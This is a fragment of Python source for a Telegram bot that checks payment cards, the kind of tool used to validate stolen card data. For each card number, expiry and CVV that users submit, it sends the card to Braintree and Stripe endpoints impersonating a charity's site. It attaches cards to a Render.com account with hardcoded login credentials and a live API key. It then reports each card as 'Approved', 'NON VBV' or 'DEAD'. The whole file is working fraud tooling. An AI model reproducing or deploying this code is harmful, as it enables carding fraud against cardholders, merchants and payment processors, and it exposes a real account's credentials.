        payload2 = { "clientSdkMetadata": {"source":"client", "integration":"dropin2","sessionId":Guid},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!){   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":ccn,"expirationMonth":mm,"expirationYear":yy,"cvv":cvv,"cardholderName":First+" botne"},"options":{"validate":"false"}}},"operationName":"TokenizeCreditCard"}
       
            
            
        
 
        head2 = {
            "user-agent": UA,   
            #"accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "authorization": "Bearer "+bearer,
            "braintree-Version": "2018-05-10",
            "host": "payments.braintree-api.com",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/"
            
        }
        
        r3 = requests.post('https://payments.braintree-api.com/graphql', json=payload2,
                          headers=head2)
        
        toc21 = time.perf_counter()
        toc2 = toc21 - tic
        res = r3.json()
        
        
      
        token1 = res['data']['tokenizeCreditCard']['token']
        brand = res['data']['tokenizeCreditCard']['creditCard']['brandCode']
        bin = res['data']['tokenizeCreditCard']['creditCard']['bin']
        bindata =  res['data']['tokenizeCreditCard']['creditCard']['binData']
        bank = bindata['issuingBank']
        country = bindata['countryOfIssuance']



        payload3 = {"amount":"1",
         "additionalInfo":{"acsWindowSize":"03"},
         "bin":bin,
         "dfReferenceId":"1_f802e5f3-2dc6-4b6d-a28b-2d98b0ebcaf3",
         "clientMetadata":{"requestedThreeDSecureVersion":"2",
         "sdkVersion":"web/3.58.0",
         "cardinalDeviceDataCollectionTimeElapsed":842,
         "issuerDeviceDataCollectionTimeElapsed":602,
         "issuerDeviceDataCollectionResult":"true"},
         "authorizationFingerprint":bearer,
         "braintreeLibraryVersion":"braintree/web/3.58.0",
         "_meta":{"merchantAppId":"charliewaller.org",
         "platform":"web",
         "sdkVersion":"3.58.0",
         "source":"client",
         "integration":"custom",
         "integrationType":"custom",
         "sessionId":Guid}
                   }
        
        
        head3 = {
            "user-agent": UA,
            "accept": "*/*",
            #"content-type": "application/x-www-form-urlencoded",
            "accept-Language": "en-GB,en;q=0.9,en-US;q=0.8",
            "host": "api.braintreegateway.com",
            "origin": "https://charliewaller.org",
            "referer": "https://charliewaller.org/"
        }
        
        r4 = session.post('https://api.braintreegateway.com/merchants/zhqjdd67457jvj8k/client_api/v1/payment_methods/'+token1+'/three_d_secure/lookup', json=payload3,
                          headers=head3)
        toc31 = time.perf_counter()
        toc3 = toc31 - tic
        toc = toc1 + toc2 + toc3
        print("check by "+FIRST)
        threeDSecureInfo = r4.json()['paymentMethod']['threeDSecureInfo']
        status = threeDSecureInfo['status']

        if 'bypassed' in r4.text:
            return await message.reply(f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ✅NON VBV B3✅
<b>MSG</b>➟ {status}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'authenticate_attempt_successful' in r4.text:
            return await message.reply(f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ✅NON VBV B3✅
<b>MSG</b>➟ {status}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'authenticate_successful' in r4.text:
            return await message.reply(f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ✅NON VBV B3✅
<b>MSG</b>➟ {status}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'lookup_not_enrolled' in r4.text:
            return await message.reply(f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ✅NON VBV B3✅
<b>MSG</b>➟ {status}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'authentication_unavailable' in r4.text:
            return await message.reply(f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ✅NON VBV B3✅
<b>MSG</b>➟ {status}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''') 
    
        if 'lookup_enrolled' in r4.text:
            return await message.reply(f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ❌VBV❌
<b>MSG</b>➟ {status}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')
 
        if 'failed' in r4.text:
            return await message.reply(f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ❌VBV❌
<b>MSG</b>➟ {status}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'error' in r4.text:
            return await message.reply(f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ❌VBV❌
<b>MSG</b>➟ {status}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'authenticate_successful_issuer_not_participating' in r4.text:
            return await message.reply(f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ❌VBV❌
<b>MSG</b>➟ {status}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'data_only_successful' in r4.text:
            return await message.reply(f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ❌VBV❌
<b>MSG</b>➟ {status}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')
 
        if 'authenticate_unable_to_authenticate' in r4.text:
            return await message.reply(f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ❌VBV❌
<b>MSG</b>➟ {status}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'unsupported' in r4.text:
            return await message.reply(f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ❌VBV❌
<b>MSG</b>➟ {status}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')
 
        if 'challenge_required' in r4.text:
            return await message.reply(f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ❌VBV❌
<b>MSG</b>➟ {status}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

@dp.message_handler(commands=['c2d'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    try:
        await dp.throttle('cv', rate=ANTISPAM)
    except Throttled:
        await message.reply('<b>Too many requests!</b>\n'
                            f'Blocked For {ANTISPAM} seconds')
    else:
        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            cc = message.text[len('/cv '):]

        if len(cc) == 0:
            return await message.reply("<b>You have not filled in the card</b>")

        x = re.findall(r'\d+', cc)
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]
        if mm.startswith('2'):
            mm, yy = yy, mm
        if len(mm) >= 3:
            mm, yy, cvv = yy, cvv, mm
        if len(ccn) < 15 or len(ccn) > 16:
            return await message.reply('<b>𝘍𝘢𝘪𝘭𝘦𝘥 𝘵𝘰 𝘱𝘢𝘳𝘴𝘦 𝘊𝘢𝘳𝘥</b>\n'
                                       '<b>Reason: 𝐖𝐑𝐎𝐍𝐆 𝐅𝐎𝐑𝐌𝐀𝐓!</b>')   
        BIN = ccn[:6]
        if BIN in BLACKLISTED:
            return await message.reply('<b>BLACKLISTED BIN</b>')
        # get guid muid sid
        load5 = {"operationName":"signIn","variables":{"email":"khanhemanhhai@gmail.com","password":"namkhanh61"},"query":"mutation signIn($email: String!, $password: String!) {  signIn(email: $email, password: $password) {    ...authResultFields    __typename  }}fragment authResultFields on AuthResult {  idToken  user {    ...userFields    sudoModeExpiresAt    __typename  }  __typename}fragment userFields on User {  id  active  createdAt  email  featureFlags  githubId  gitlabId  name  notifyOnFail  notifyOnPrUpdate  otpEnabled  passwordExists  tosAcceptedAt  intercomHMAC  __typename}"}

        header = {
            "accept": "*/*",
            "user-agent": UA,
            "content-type": "application/json"
            
            
        }

        rz = session.post('https://api.render.com/graphql',
                          json=load5, headers=header)
        
        jsne = rz.json()
        
        tokenn = jsne['data']['signIn']['idToken']
        toc11 = time.perf_counter()
        toc1 = toc11 -tic
      
        headers = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }

        b = session.get('https://ip.seeip.org/').text

        s = session.post('https://m.stripe.com/6', headers=headers)
        r = s.json()
        Guid = r['guid']
        Muid = r['muid']
        Sid = r['sid']

        # hmm
        load = {
            "guid": Guid,
            "muid": Muid,
            "sid": Sid,
            "key": "pk_live_Jv30CQQpAQyWO9FMp3i5IPOt",
            "card[name]": Name,
            "card[number]": ccn,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv
        }

        header = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": UA,
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "accept-language": "en-US,en;q=0.9"
            
        }

        rx = session.post('https://api.stripe.com/v1/tokens',
                          data=load, headers=header)
        res = rx.json() 
        
        toc22 = time.perf_counter()
        toc2 = toc22 - tic
       
        
        LastF = f'************{ccn[-4:]}'

        if 'declined' in rx.text:
            
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg}
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc1 - tic:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>

<b>BOT</b>: @{BOT_USERNAME}''')
        if 'incorrect_number' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Incorrect_number
<b>MSG</b>➟ Your card number is incorrect.
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc1 - tic:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')
        if 'Request rate limit exceeded.' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Request rate limit exceeded.
<b>MSG</b>➟ {msg}
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc1 - tic:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'API Key provided' in rx.text:
            res = rx.json()
            msg = res['error'][0]['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ API Key provided
<b>MSG</b>➟ {msg}
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc1 - tic:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')
        if 'security code is invalid' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Security code is invalid.
<b>MSG</b>➟ {msg}
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc1 - tic:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        else: 
          token =res['id']
          card = res['card']
          country = card['country']
          brand = card['brand']
          funding = card['funding']
          last4 = card['last4']
          

          payload = {"operationName":"updateCard","variables":{"id":"usr-cbotlpk41lscvckv4cj0","token":token,"brand":brand,"last4":last4,"country":"US","region":"NY"},"query":"mutation updateCard($id: String!, $token: String!, $brand: String!, $last4: String!, $country: String!, $region: String!) {\n  updateCard(\n    id: $id\n    token: $token\n    brand: $brand\n    last4: $last4\n    country: $country\n    region: $region\n  ) {\n    ...ownerFields\n    ...ownerBillingFields\n    __typename\n  }\n}\n\nfragment ownerBillingFields on Owner {\n  cardBrand\n  cardLast4\n  __typename\n}\n\nfragment ownerFields on Owner {\n  id\n  billingStatus\n  email\n  featureFlags\n  notEligibleFeatureFlags\n  notifyOnFail\n  slackConnected\n  logEndpoint {\n    endpoint\n    token\n    updatedAt\n    __typename\n  }\n  __typename\n}\n"}
                    
          head = {
            "authorization": "Bearer "+tokenn
           
            
        }

          ri = requests.post('https://api.render.com/graphql', json=payload,
                          headers=head)
          res1 = ri.json() 
          print("check by "+FIRST)

          toc33 = time.perf_counter()
          toc3 = toc33 - tic
          toc = toc1 + toc2 + toc3
          if ',"billingStatus":"ACTIVE' in ri.text:
            return await message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #ApprovedCVV
<b>MSG</b>➟ {ri.text}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

          if 'incorrect_cvc' in ri.text:
            return await message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ {ri.text}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

          if 'errors' in ri.text:
            msg = res1['errors'][0]['message']
            #msg = res1['errors']['message']
            
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>MSG</b>➟ {msg}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

          await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ DEAD
<b>MSG</b>➟ {ri.text}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')          
          
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, loop=loop)
